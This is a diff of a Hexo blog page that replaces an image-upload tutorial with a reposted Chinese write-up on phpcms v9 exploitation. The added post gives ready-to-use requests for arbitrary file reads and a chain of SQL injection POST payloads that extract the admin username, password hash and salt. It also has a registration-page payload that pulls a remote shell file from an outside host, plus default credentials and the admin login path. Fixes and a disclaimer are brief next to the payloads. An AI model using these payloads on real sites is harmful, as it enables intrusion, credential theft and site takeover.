@@ -60,7 +60,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="markdown,图床," />
+  <meta name="keywords" content="-phpcms -漏洞利用," />
 
 
 
@@ -76,20 +76,18 @@
 
 
 
-<meta name="description" content="众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接">
-<meta name="keywords" content="markdown,图床">
+<meta name="description" content="如题所示">
+<meta name="keywords" content="-phpcms -漏洞利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows下解决图片上传的麻烦">
-<meta property="og:url" content="http://maplege.github.io/2017/08/29/solveHexoImage/index.html">
+<meta property="og:title" content="phpcms漏洞利用【转载】">
+<meta property="og:url" content="http://maplege.github.io/2017/08/31/phpcmsLoopholes/index.html">
 <meta property="og:site_name" content="MapleGe">
-<meta property="og:description" content="众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接">
+<meta property="og:description" content="如题所示">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170829/HGIHdgKJig.png?imageslim">
-<meta property="og:updated_time" content="2017-08-29T05:49:22.929Z">
+<meta property="og:updated_time" content="2017-08-31T05:08:00.728Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows下解决图片上传的麻烦">
-<meta name="twitter:description" content="众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接">
-<meta name="twitter:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170829/HGIHdgKJig.png?imageslim">
+<meta name="twitter:title" content="phpcms漏洞利用【转载】">
+<meta name="twitter:description" content="如题所示">
 
 
 
@@ -119,13 +117,13 @@
 
 
 
-  <link rel="canonical" href="http://maplege.github.io/2017/08/29/solveHexoImage/"/>
+  <link rel="canonical" href="http://maplege.github.io/2017/08/31/phpcmsLoopholes/"/>
 
 
 
 
 
-  <title>windows下解决图片上传的麻烦 | MapleGe</title>
+  <title>phpcms漏洞利用【转载】 | MapleGe</title>
   
 
 
@@ -296,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/08/29/solveHexoImage/">
+    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/08/31/phpcmsLoopholes/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="暮沉沉">
@@ -313,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">windows下解决图片上传的麻烦</h1>
+          <h1 class="post-title" itemprop="name headline">phpcms漏洞利用【转载】</h1>
         
 
         <div class="post-meta">
@@ -325,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-29T13:31:06+08:00">
-                2017-08-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-31T12:56:56+08:00">
+                2017-08-31
               </time>
             
 
@@ -348,8 +346,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/markdown/" itemprop="url" rel="index">
-                    <span itemprop="name">markdown</span>
+                  <a href="/categories/漏洞利用/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞利用</span>
                   </a>
                 </span>
 
@@ -380,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  311
+                  1,938
                 </span>
               
 
@@ -396,7 +394,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  10
                 </span>
               
             </div>
@@ -417,26 +415,47 @@
       
 
       
-        <p>众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接<br><a id="more"></a></p>
-<h1 id="Hexo-MD-七牛API-MPic图床神器"><a href="#Hexo-MD-七牛API-MPic图床神器" class="headerlink" title="Hexo_MD + 七牛API+MPic图床神器"></a>Hexo_MD + 七牛API+MPic图床神器</h1><ul>
-<li>注册账号</li>
-<li>你要到<a href="https://www.qiniu.com/" target="_blank" rel="external">七牛官网</a>上注册一个七牛个人账号，经过支付宝认证之后可以获得10G的免费储存空间。</li>
-<li><p>创建一个对象储存空间，作为分享图片的仓库<br>创建选项中只需要注意选择公开空间即可，其它的无所谓。</p>
-</li>
-<li><p>创建结束后检查一下空间的图片保护选项是否关闭，如果没有关闭，就手动关闭一下。</p>
-</li>
-<li>下载软件<br>：Mpic 图床神器。</li>
-<li>下载完成后，设置账号——》设置如下图<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170829/HGIHdgKJig.png?imageslim" alt="please wait"></li>
-<li>具体配置：</li>
-</ul>
-<ol>
-<li>七牛空间名就是创建的空间名称</li>
-<li>AccessKey和SecretKey在个人中心可以看到，复制进来</li>
-<li>域名是创建的空间的域名</li>
-</ol>
-<ul>
-<li>设置完成后，需要上传图片的时候，打开软件，复制或者截图就会自动上传并生成图片链接了（在屏幕右下角有程序图标，右键可以开启或关闭自动上传功能）</li>
-</ul>
+        <p>如题所示<br><a id="more"></a></p>
+<h1 id="phpcms漏洞"><a href="#phpcms漏洞" class="headerlink" title="phpcms漏洞"></a>phpcms漏洞</h1><p>　　最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。</p>
+<p>免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负<br>phpcms 任意文件读取漏洞</p>
+<p>更新于2017年5月4日<br>漏洞具体细节参考：<a href="http://bobao.360.cn/learning/detail/3805.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3805.html</a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：登录普通用户，访问链接："><a href="#方案一：登录普通用户，访问链接：" class="headerlink" title="方案一：登录普通用户，访问链接："></a>方案一：登录普通用户，访问链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C</div></pre></td></tr></table></figure>
+<p>获取分配的att_json,然后将这段json值带入到down类的init函数中去：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ</div></pre></td></tr></table></figure>
+<h3 id="方案二：在未登录的情况下访问："><a href="#方案二：在未登录的情况下访问：" class="headerlink" title="方案二：在未登录的情况下访问："></a>方案二：在未登录的情况下访问：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</div></pre></td></tr></table></figure>
+<p>获取当前的siteid,然后再访问:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C</div><div class="line">POST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW</div></pre></td></tr></table></figure>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>升级至官方最新版本</p>
+<h2 id="phpcms-sql漏洞"><a href="#phpcms-sql漏洞" class="headerlink" title="phpcms sql漏洞"></a>phpcms sql漏洞</h2><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>存在sql注入漏洞的页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.139:8080/phpcms/index.php?m=member&amp;c=index&amp;a=login</div></pre></td></tr></table></figure>
+<p>获取当前数据库，post：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure>
+<p>获取当前用户，post：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure>
+<p>获取表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema=&apos;phpcmsv9&apos;%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>若要获取其他表名，修改limit即可。</p>
+<p>获取用户名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>获取密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>phpcms是加盐（salt）的，获取salt:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>以上Poc来自：<a href="https://www.unhonker.com/bug/1834.html" target="_blank" rel="external">https://www.unhonker.com/bug/1834.html</a></p>
+<h2 id="exp漏洞利用脚本"><a href="#exp漏洞利用脚本" class="headerlink" title="exp漏洞利用脚本"></a>exp漏洞利用脚本</h2><p>exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：<a href="https://www.seebug.org/monster/" target="_blank" rel="external">https://www.seebug.org/monster/</a><br>exp脚本可以参考：<a href="https://www.waitalone.cn/phpcmsv9-authkey-exp.html" target="_blank" rel="external">https://www.waitalone.cn/phpcmsv9-authkey-exp.html</a><br>漏洞细节请参考：<a href="http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A" target="_blank" rel="external">http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A</a></p>
+<h3 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h3><p>去掉modules\content\down.php文件</p>
+<h2 id="phpcms注册页面getshell漏洞"><a href="#phpcms注册页面getshell漏洞" class="headerlink" title="phpcms注册页面getshell漏洞"></a>phpcms注册页面getshell漏洞</h2><p>存在的漏洞：php远程文件包含、任意文件上传</p>
+<p>漏洞利用点：phpcms注册页面</p>
+<p>利用类型：http post请求导致任意文件上传+getshell</p>
+<h3 id="Post-Poc"><a href="#Post-Poc" class="headerlink" title="Post Poc"></a>Post Poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">siteid=1&amp;modelid=11&amp;username=newbie&amp;password=newbie&amp;email=newbie@qq.com&amp;info[content]=&lt;img src=http://shhdmqz.com/newbie.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</div></pre></td></tr></table></figure>
+<p>注意：<a href="http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。" target="_blank" rel="external">http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。</a></p>
+<h3 id="漏洞利用细节"><a href="#漏洞利用细节" class="headerlink" title="漏洞利用细节"></a>漏洞利用细节</h3><p>　访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《img src=<a href="http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。" target="_blank" rel="external">http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。</a></p>
+<h3 id="exp漏洞利用脚本-1"><a href="#exp漏洞利用脚本-1" class="headerlink" title="exp漏洞利用脚本"></a>exp漏洞利用脚本</h3><p>exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：<a href="https://www.seebug.org/monster/" target="_blank" rel="external">https://www.seebug.org/monster/</a></p>
+<h3 id="漏洞修复方案-1"><a href="#漏洞修复方案-1" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h3><p>暂时性修复：</p>
+<p>关闭注册页面<br>关闭远程文件包含，即关闭allow_url_fopen</p>
+<p>彻底性修复：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">修改phpcms/libs/classes/attachement.class.php文件中的download函数在</div><div class="line">foreach($remotefileurls as $k=&gt;$file)循环中，大约是167行左右的位置，将</div><div class="line">if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);</div><div class="line">修改成</div><div class="line">$filename = fileext($k);</div></pre></td></tr></table></figure>
+<p>关于文件包含漏洞，可参考：文件包含漏洞</p>
+<h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=..\/..\/caches/error_log.php</div></pre></td></tr></table></figure>
+<h2 id="phpcms敏感信息"><a href="#phpcms敏感信息" class="headerlink" title="phpcms敏感信息"></a>phpcms敏感信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">默认账号密码：phpcms/phpcms</div><div class="line">默认后台： http://www.xx.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=</div><div class="line">会员中心地址：index.php?m=member&amp;c=index&amp;a=login</div><div class="line">本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！</div></pre></td></tr></table></figure>
+<p>本文标题:phpcms漏洞<br>文章作者:nMask<br>发布时间:2017年04月12日 - 09:04<br>最后更新:2017年07月25日 - 20:07<br>原始链接:<a href="http://thief.one/2017/04/12/1/" target="_blank" rel="external">http://thief.one/2017/04/12/1/</a><br>许可协议: 署名-非商业性使用-禁止演绎 4.0 国际 转载请保留原文链接及作者。</p>
 
       
     </div>
@@ -447,37 +466,6 @@
 	
 	  <div>
 	     
-<div class="my_post_copyright">
-  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-    
-    <!-- JS库 sweetalert 可修改路径 -->
-	  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
-	    <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
-		  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-		    <p><span>本文标题:</span><a href="/2017/08/29/solveHexoImage/">windows下解决图片上传的麻烦</a></p>
-			  <p><span>文章作者:</span><a href="/" title="访问 暮沉沉 的个人博客">暮沉沉</a></p>
-			    <p><span>发布时间:</span>2017年08月29日 - 13:08</p>
-				  <p><span>最后更新:</span>2017年08月29日 - 13:08</p>
-				    <p><span>原始链接:</span><a href="/2017/08/29/solveHexoImage/" title="windows下解决图片上传的麻烦">http://maplege.github.io/2017/08/29/solveHexoImage/</a>
-					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2017/08/29/solveHexoImage/"  aria-label="复制成功！"></i></span>
-						  </p>
-						    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
-							</div>
-							<script> 
-							    var clipboard = new Clipboard('.fa-clipboard');
-								    clipboard.on('success', $(function(){
-												      $(".fa-clipboard").click(function(){
-															          swal({   
-																			            title: "",   
-																						          text: '复制成功',   
-																								            html: false,
-																											          timer: 500,   
-																													            showConfirmButton: false
-																																        });
-																	        });
-													      }));  
-</script>
-
 
 	  </div>
 	
@@ -504,9 +492,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/markdown/" rel="tag"><i class="fa fa-tag"></i> markdown</a>
-          
-            <a href="/tags/图床/" rel="tag"><i class="fa fa-tag"></i> 图床</a>
+            <a href="/tags/phpcms-漏洞利用/" rel="tag"><i class="fa fa-tag"></i> -phpcms -漏洞利用</a>
           
         </div>
       
@@ -519,8 +505,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/26/boolBlandSQLInjection/" rel="next" title="Mysql布尔盲注payload">
-                <i class="fa fa-chevron-left"></i> Mysql布尔盲注payload
+              <a href="/2017/08/29/newUbuntu/" rel="next" title="Ubuntu安装完成可以做的一些事">
+                <i class="fa fa-chevron-left"></i> Ubuntu安装完成可以做的一些事
               </a>
             
           </div>
@@ -528,10 +514,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/29/newUbuntu/" rel="prev" title="Ubuntu安装完成可以做的一些事">
-                Ubuntu安装完成可以做的一些事 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -681,7 +663,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hexo-MD-七牛API-MPic图床神器"><span class="nav-number">1.</span> <span class="nav-text">Hexo_MD + 七牛API+MPic图床神器</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#phpcms漏洞"><span class="nav-number">1.</span> <span class="nav-text">phpcms漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方案一：登录普通用户，访问链接："><span class="nav-number">1.1.1.</span> <span class="nav-text">方案一：登录普通用户，访问链接：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方案二：在未登录的情况下访问："><span class="nav-number">1.1.2.</span> <span class="nav-text">方案二：在未登录的情况下访问：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方案"><span class="nav-number">1.1.3.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms-sql漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">phpcms sql漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc"><span class="nav-number">1.2.1.</span> <span class="nav-text">Poc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp漏洞利用脚本"><span class="nav-number">1.3.</span> <span class="nav-text">exp漏洞利用脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复方案"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms注册页面getshell漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">phpcms注册页面getshell漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Post-Poc"><span class="nav-number">1.4.1.</span> <span class="nav-text">Post Poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用细节"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞利用细节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp漏洞利用脚本-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">exp漏洞利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复方案-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">漏洞修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意文件读取漏洞"><span class="nav-number">1.5.</span> <span class="nav-text">任意文件读取漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms敏感信息"><span class="nav-number">1.6.</span> <span class="nav-text">phpcms敏感信息</span></a></li></ol></li></ol></div>
             
 
           </div>
